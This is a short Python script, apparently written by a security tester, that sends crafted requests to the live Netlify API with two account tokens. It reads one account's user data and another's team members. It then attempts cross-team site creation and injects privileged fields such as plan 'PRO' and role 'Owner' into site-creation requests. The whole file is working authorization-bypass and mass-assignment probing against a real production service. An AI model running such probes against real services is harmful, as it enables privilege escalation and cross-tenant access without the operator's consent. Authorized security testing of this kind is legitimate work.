# -*- coding: utf-8 -*-
"""A team members 结构 + B user 信息 + POST /sites 创建字段注入"""
import http.client, ssl, gzip, brotli, json, sys, time, random, string
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import TOKEN_A, TOKEN_B

ctx = ssl.create_default_context()

def req(method, path, body=None, token=TOKEN_A, timeout=25):
    conn = http.client.HTTPSConnection('api.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json', 'Content-Type': 'application/json'}
    if token: h['Authorization'] = 'Bearer ' + token
    b = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=b, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    st = r.status
    txt = raw.decode('utf-8', 'ignore')
    conn.close()
    return st, txt

def probe(tag, m, p, body=None, tok=TOKEN_A):
    st, b = req(m, p, body, tok)
    print('%-58s %s | %s' % (tag, st, b[:250].replace('\n', ' ')))
    return st, b

print('== 1. B 的 user 信息(email 用于邀请) ==')
st, b = probe('B GET /user', 'GET', '/api/v1/user', None, TOKEN_B)
print()
print('== 2. A team members ==')
st, b = probe('A GET /1643584176/members', 'GET', '/api/v1/1643584176/members')
print()
print('== 3. POST /sites 创建字段注入 ==')
rnd = ''.join(random.choices(string.ascii_lowercase, k=8))
print('--- 3.1 基线: 带 name + account_slug=B 的 team(跨 team 创建?) ---')
st, b = probe('POST sites account_slug=libobo01(B)', 'POST', '/api/v1/sites',
              {'name': 'zz-xa-%s' % rnd, 'account_slug': 'libobo01'})
print('--- 3.2 account_slug=A 自己 + 敏感字段 ---')
st, b = probe('POST sites slug=A + plan/role', 'POST', '/api/v1/sites',
              {'name': 'zz-xb-%s' % rnd, 'account_slug': '1643584176',
               'plan': 'PRO', 'role': 'Owner', 'user_id': '0000', 'build_image': 'x'})
print('done')
